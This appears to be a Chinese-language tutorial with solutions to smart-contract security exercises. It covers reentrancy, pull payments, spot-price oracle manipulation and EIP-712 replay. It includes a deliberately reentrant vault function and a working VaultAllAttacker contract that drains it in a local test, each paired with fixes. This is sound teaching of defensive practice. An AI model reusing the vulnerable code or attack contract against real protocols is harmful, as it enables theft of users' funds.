练习 1：给 EtherVault 增加 withdrawAll，并写重入攻击与修复测试

在漏洞版 EtherVault 中增加：

solidity
function withdrawAll() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, 'no balance');

    // 仍然是先转账、后清零，因此同样可被重入
    (bool ok, ) = msg.sender.call{value: amount}('');
    require(ok, 'transfer failed');

    balances[msg.sender] = 0;
    emit Withdrawn(msg.sender, amount);
}

新增攻击合约：

solidity
interface IVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract VaultAllAttacker {
    IVault public immutable vault;

    constructor(address vault_) {
        vault = IVault(vault_);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdrawAll();
        }
    }
}

修复版 FixedVault 增加同名函数：

solidity
function withdrawAll() external nonReentrant {
    uint256 amount = balances[msg.sender];
    if (amount == 0) revert NoBalance();

    balances[msg.sender] = 0;

    (bool ok, ) = msg.sender.call{value: amount}('');
    require(ok, 'transfer failed');

    emit Withdrawn(msg.sender, amount);
}

ts
it('漏洞版 withdrawAll 可被重入抽干', async () => {
  const [victim, attackerEOA] = await ethers.getSigners()
  const vault = await ethers.deployContract('EtherVault')
  await vault.connect(victim).deposit({ value: VICTIM_DEPOSIT })

  const attacker = await ethers.deployContract('VaultAllAttacker', [await vault.getAddress()])
  await attacker.connect(attackerEOA).attack({ value: ONE_ETH })

  expect(await ethers.provider.getBalance(await vault.getAddress())).to.equal(0n)
  expect(await ethers.provider.getBalance(await attacker.getAddress())).to.equal(
    VICTIM_DEPOSIT + ONE_ETH
  )
})

it('修复版 withdrawAll 被重入锁拦截，资金留在金库', async () => {
  const [victim, attackerEOA] = await ethers.getSigners()
  const vault = await ethers.deployContract('FixedVault')
  await vault.connect(victim).deposit({ value: VICTIM_DEPOSIT })

  const attacker = await ethers.deployContract('VaultAllAttacker', [await vault.getAddress()])

  await expect(attacker.connect(attackerEOA).attack({ value: ONE_ETH }))
    .to.be.revertedWith('transfer failed')

  expect(await ethers.provider.getBalance(await vault.getAddress())).to.equal(VICTIM_DEPOSIT)
  expect(await ethers.provider.getBalance(await attacker.getAddress())).to.equal(0n)
})

要点：

  • withdrawAll 必须是“提取调用者自己的余额”，绝不能写成 address(this).balance；后者即使没有重入，也会让第一个调用者偷走别人的钱。
  • 修复版同时使用 CEI 与 nonReentrant。只做其中一个也能挡住这次攻击，但组合更耐重构。
  • 攻击交易整体回滚时，攻击者存入的 1 ETH 也会退回，所以断言攻击合约余额为 0。
  • 外层看到的是 transfer failed，内层真正的 ReentrantCall 被低级调用的布尔返回值吞掉了。排查时要看调用栈。
练习 2：把 SafeWallet.withdraw 改成 pull payment

把“owner 一次性扫走全部余额”改成“每个存款人自己提取”，同时去掉 withdraw 上的 onlyOwner：

solidity
mapping(address => uint256) public pendingWithdrawals;

event Withdrawal(address indexed account, uint256 amount);

error NothingToWithdraw(address caller);

receive() external payable {
    pendingWithdrawals[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    if (amount == 0) revert NothingToWithdraw(msg.sender);

    // 先清零，再转账
    pendingWithdrawals[msg.sender] = 0;

    (bool ok, ) = msg.sender.call{value: amount}('');
    require(ok, 'transfer failed');

    emit Withdrawal(msg.sender, amount);
}

测试：

ts
it('pull payment 只影响调用者自己的余额', async () => {
  const [alice, bob] = await ethers.getSigners()
  const wallet = await ethers.deployContract('SafeWallet', [], alice)

  await alice.sendTransaction({ to: await wallet.getAddress(), value: 1n })
  await bob.sendTransaction({ to: await wallet.getAddress(), value: 2n })

  await expect(wallet.connect(bob).withdraw())
    .to.emit(wallet, 'Withdrawal')
    .withArgs(bob.address, 2n)

  expect(await wallet.pendingWithdrawals(alice.address)).to.equal(1n)
  expect(await wallet.pendingWithdrawals(bob.address)).to.equal(0n)
})

为什么降低 DoS 风险：

  • push 模式下，合约主动给每个收款人转账；只要一个人 revert，整批交易就回滚，其他人也拿不到钱。
  • pull 模式下，合约只更新记账，收款人自己发起交易。某个人失败只会影响他自己，其他人的记账和资金完全不受影响。
  • 失败时不需要回滚整批，重试也可以按账户粒度进行。
  • 代价是用户需要自己发一笔提现交易，并且要有人承担 gas；前端应提供“可提取余额”和一键提现入口。
  • 本例仍建议加 nonReentrant，或者至少保持“先清零再转账”的顺序。
练习 3：按现货价格清算的借贷合约，单笔 swap 造成坏账

这段测试放在 examples/12-defi 里运行，因为那里有 MiniAMM 和 MockToken。如果已经做了第 12 章练习 1，MiniAMM 构造函数要多传一个 feeRecipient：

ts
import { expect } from 'chai'
import { ethers } from 'hardhat'

const E18 = 10n ** 18n
const BPS = 10_000n
const THRESHOLD = 8_000n

describe('现货价操纵', () => {
  it('一笔 swap 把抵押品价格打低，健康仓位变成可清算并产生坏账', async () => {
    const [deployer, attacker] = await ethers.getSigners()

    const col = await ethers.deployContract('MockToken', ['Collateral', 'COL'])
    const usd = await ethers.deployContract('MockToken', ['USD', 'USD'])
    const amm = await ethers.deployContract('MiniAMM', [
      await col.getAddress(),
      await usd.getAddress()
      // 若已做第 12 章练习 1，再传 feeRecipient.address
    ])

    await col.mint(deployer.address, 2_000n * E18)
    await usd.mint(deployer.address, 2_000n * E18)
    await col.mint(attacker.address, 500n * E18)

    await col.connect(deployer).approve(await amm.getAddress(), ethers.MaxUint256)
    await usd.connect(deployer).approve(await amm.getAddress(), ethers.MaxUint256)
    await col.connect(attacker).approve(await amm.getAddress(), ethers.MaxUint256)

    await amm.connect(deployer).addLiquidity(1_000n * E18, 1_000n * E18)

    const spot = async () =>
      ((await amm.reserve1()) * E18) / (await amm.reserve0())
    const fair = await spot()

    // 抵押 10 COL、借 7 USD；按 1 USD/COL 是健康仓位
    const collateral = 10n * E18
    const debt = 7n * E18
    const health = (collateral * fair * THRESHOLD) / (BPS * debt)
    expect(health).to.be.greaterThan(E18)

    // 攻击者把 300 COL 砸进池子，单笔交易压低现货价
    await amm.connect(attacker).swap(300n * E18, true, 0n)
    const manipulated = await spot()

    const manipulatedHealth = (collateral * manipulated * THRESHOLD) / (BPS * debt)
    expect(manipulated).to.be.lessThan((fair * 7n) / 10n)
    expect(manipulatedHealth).to.be.lessThan(E18)

    // 部分清算：还 5 USD，拿走 5 * 1.05 / 新价格 的抵押
    const repay = 5n * E18
    const seized = (repay * 10_500n * E18) / (BPS * manipulated)
    expect(seized).to.be.lessThan(collateral)

    const remainingDebt = debt - repay
    const remainingCollateral = collateral - seized
    const badDebt = remainingDebt - (remainingCollateral * fair) / E18
    expect(badDebt).to.be.greaterThan(0n)
  })
})

要点：

  • 攻击者不需要控制预言机合约，只需要在同一个池子里做一笔足够大的 swap，让“现货价”瞬间偏离真实价格。
  • 如果清算逻辑直接读 reserve1 / reserve0，同一区块内 swap 后立即清算，就能用被压低的价格拿走更多抵押。
  • 价格恢复后，借款人剩余抵押价值已经低于剩余债务，差额就是协议坏账。
  • 测试用公式模拟 lending 的清算；接真实合约时，把同一 spot() 价格源接到 MiniLending，断言逻辑不变。
  • 防守方要用 TWAP、多源聚合、价格偏离阈值、单区块价格变化上限、清算延迟与坏账准备金，而不是只加一个 require。
  • 这是教学模型，真实借贷还要考虑流动性、利率、预言机故障与治理延迟。
练习 4：签名重放测试，说明缺少哪个字段

用 EIP-712 的两个 domain 模拟两条链：

ts
import { expect } from 'chai'
import { ethers } from 'hardhat'

describe('签名 domain 分离', () => {
  it('缺少 chainId 时同一签名可以在另一条链上重放', async () => {
    const wallet = ethers.Wallet.createRandom()

    const types = {
      Claim: [
        { name: 'user', type: 'address' },
        { name: 'amount', type: 'uint256' },
        { name: 'nonce', type: 'uint256' }
      ]
    }
    const value = { user: wallet.address, amount: 1n, nonce: 0n }

    const badDomain = {
      name: 'BadVerifier',
      version: '1',
      verifyingContract: '0x' + '11'.repeat(20)
      // 故意不写 chainId
    }

    const signature = await wallet.signTypedData(badDomain, types, value)

    // 两个“链”使用同一个 domain，签名都恢复出同一地址
    expect(ethers.verifyTypedData(badDomain, types, value, signature)).to.equal(wallet.address)
    expect(ethers.verifyTypedData({ ...badDomain }, types, value, signature)).to.equal(wallet.address)

    const domainA = { ...badDomain, chainId: 31337 }
    const signatureA = await wallet.signTypedData(domainA, types, value)

    const recoveredOnB = ethers.verifyTypedData(
      { ...badDomain, chainId: 1 },
      types,
      value,
      signatureA
    )

    expect(recoveredOnB).to.not.equal(wallet.address)
  })
})

缺少的字段是 chainId。生产实现还需要：

  • verifyingContract：把签名绑定到具体合约地址，防止同链上另一个合约重放。
  • 每笔签名递增的 nonce，并在链上记录 used[nonce] = true。
  • deadline / expiry：旧签名不能永久有效。
  • 明确的 types 与字段顺序；字段被替换或新增时要重新审计。
  • 域分隔符建议使用 EIP-712 的 domainSeparator，不要在业务合约里手写 keccak256(abi.encodePacked(...))。

如果签名只用于链下展示、不触发资金动作，重放风险较低；只要签名能触发转账、授权或治理投票，就必须做完整的 domain 分离与 nonce 防护。
